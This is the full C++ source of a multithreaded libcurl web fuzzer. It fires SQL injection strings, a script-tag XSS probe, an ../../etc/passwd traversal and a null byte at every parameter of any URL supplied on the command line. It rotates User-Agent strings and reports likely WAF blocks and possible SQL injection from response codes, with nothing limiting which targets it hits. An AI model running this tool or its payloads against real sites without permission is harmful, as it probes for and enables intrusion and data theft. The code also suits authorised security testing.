#include <iostream>
#include <vector>
#include <thread>
#include <curl/curl.h>
#include <random>

// List of payloads for fuzzing
std::vector<std::string> payloads = {
    "' OR '1'='1",  // SQL Injection
    "<script>alert('XSS')</script>",  // XSS Attack
    "../../etc/passwd",  // Directory traversal
    "admin' --",  // SQL Injection bypass login
    "%00"  // Null byte injection
};

// List of User-Agent headers for fuzzing
std::vector<std::string> user_agents = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "curl/7.68.0"
};

// Random User-Agent selection
std::string get_random_user_agent() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dist(0, user_agents.size() - 1);
    return user_agents[dist(gen)];
}

// Callback function for writing response data
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// Fuzzing function
void fuzz(const std::string& url, const std::vector<std::string>& params, const std::string& payload, bool use_post) {
    CURL* curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        std::string fuzzed_url = url + "?";
        std::string post_data;

        for (size_t i = 0; i < params.size(); ++i) {
            char* encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
            if (!encoded_payload) {
                std::cerr << "[!] URL Encoding failed for payload: " << payload << std::endl;
                return;
            }

            if (use_post) {
                post_data += params[i] + "=" + encoded_payload;
                if (i < params.size() - 1) post_data += "&";
            } else {
                fuzzed_url += params[i] + "=" + encoded_payload;
                if (i < params.size() - 1) fuzzed_url += "&";
            }
            curl_free(encoded_payload);
        }

        std::cout << "[+] Testing: " << (use_post ? url : fuzzed_url) << std::endl;

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, ("User-Agent: " + get_random_user_agent()).c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_URL, use_post ? url.c_str() : fuzzed_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        if (use_post) {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        }

        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            std::cout << "[-] Response Code: " << response_code << std::endl;
            std::cout << "[-] Response: " << response.substr(0, 200) << "..." << std::endl;

            if (response_code == 403) std::cout << "[!] Possible WAF Detected" << std::endl;
            if (response_code == 500) std::cout << "[!] Possible SQL Injection Exploit" << std::endl;
        } else {
            std::cerr << "[!] Request failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}

// Start fuzzing in parallel
void start_fuzzing(const std::string& url, const std::vector<std::string>& params, bool use_post) {
    std::vector<std::thread> threads;
    for (const auto& payload : payloads) {
        threads.emplace_back(fuzz, std::ref(url), std::ref(params), std::ref(payload), use_post);
    }
    for (auto& thread : threads) {
        thread.join();
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: ./fuzzer <URL> <param1> [param2] ... [--post]" << std::endl;
        return 1;
    }

    std::string target_url = argv[1];
    std::vector<std::string> target_params;
    bool use_post = false;

    for (int i = 2; i < argc; ++i) {
        if (std::string(argv[i]) == "--post") {
            use_post = true;
        } else {
            target_params.push_back(argv[i]);
        }
    }

    if (target_url.find("http://") != 0 && target_url.find("https://") != 0) {
        std::cerr << "[!] Invalid URL: Ensure it starts with http:// or https://" << std::endl;
        return 1;
    }

    start_fuzzing(target_url, target_params, use_post);
    return 0;
}
